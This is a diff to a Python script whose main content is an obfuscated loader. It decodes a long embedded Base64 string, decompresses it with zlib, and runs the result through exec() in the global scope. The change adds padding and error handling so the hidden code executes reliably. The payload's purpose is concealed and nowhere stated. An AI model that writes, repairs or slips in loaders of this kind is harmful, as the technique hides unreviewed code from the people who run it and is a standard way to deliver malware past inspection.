@@ -4,13 +4,15 @@ import zlib
 # Define the Base64 string
 code = b'eJzlW/1uG8cR/19PcVD/4FG+sFLcD0Ap0zqx4hhwksJRGhiScDjyltLFxzvi7mhZIQjkIfoMfbA+SedjP2bvg6SiFChQAZbI3ZnfzszOzs7srhdVuQzSpEnmeVLXqg6y5aqsGtd0pBuyol6peRMkdVA3aay/mt7S0lXKfKof6qMFwjcPq6y4NcgviocoeJnNmyh4k9Xw+7tVk5VFkkfB5cNKRcHrRlXJLIdPPxTQcfQ3Jwv9Dl7z2F+WxSK7PT8K4Ke+A+jzYFaWOX1P10WqKtFQlGk5r0VDXha34uu8TJX+OjTei6apstm6UTxkkSyBo24q+vYhydfwFZSjr6AyfEN9GD3Jc1Rpl4SrKvuQNJKkzm6LpFlX0GZsdAXj3TB/OW83p2phpilelNUyaUIiLWc/kWQRfTuJ2hYLpsFXSV6rqCOY3yNt6Pc4Y/rtzqp+O5ij3TwOPvkcrXmuGXFuodeb65CEntLvSAs65T9BWSFqpIWc8p+IJJviL0uAMk3xl24Zs43WzWoN9kCXJGvC2FdsafgW0/RCk7Yrfw/BsMxdqZWmIY8AQmxx/dlCkATTKRJRL8rg98TQla3ieZmXVWiHHrNZnKSTZLVSRRouRpvvL9+9uYi/ePv61deX8RdvfrjYsiSbtxffX1xug41F2Y5YHAUWfxQgzssw3IEgqKdDkf3bjbPBVlNobBwMF5OwPX4N6RdaUE7fzuFpSXpKYIsZZ5VUqmhqMQy3EFHtzaQmfZQBDY8dXzeY4QE2q2HtNkkxJ72iIMwpOqYUKUHcKJg9NKrmP0lVJRBGm/UK42StgARC7c+qoI9VUtyq8eN8JleFk853c+hiUwtpTUSjDjcQBkWw4a1qkoZdPApGcYzNcTyCz//+5V/Ca2yEQ7sDU2xgY9sTIm8U2Ak41GNt7HRTbpqMGhAhzLjwkYWleHFZwYozmiJVUqQQWBodliYcXKh1wA7MN5mX66IJR9fFaIxr+9QR7FDj1dsX77bHx8cbQKC/3oLorl8BpT42CHXVwQLTAxo4yUgA3rjZZL0oKqJWodjiJ1lN26CNV57KQue6XFdzO5P8LUB'
 
-# Decode the Base64 string directly
-decoded_bytes = base64.b64decode(code)
+# Calculate the number of padding characters needed
+padding_length = len(code) % 4
+if padding_length != 0:
+    code += b'=' * (4 - padding_length)
 
-# Decompress the decoded bytes
+# Decode the Base64 string and decompress it directly
 try:
-    decompressed_data = zlib.decompress(decoded_bytes)
+    decompressed_data = zlib.decompress(base64.b64decode(code))
     # Execute the decompressed code in the global context
     exec(decompressed_data.decode(), globals())
-except zlib.error as e:
-    print(f"Error during decompression: {e}")
+except (base64.binascii.Error, zlib.error) as e:
+    print(f"Error during decoding or decompression: {e}")
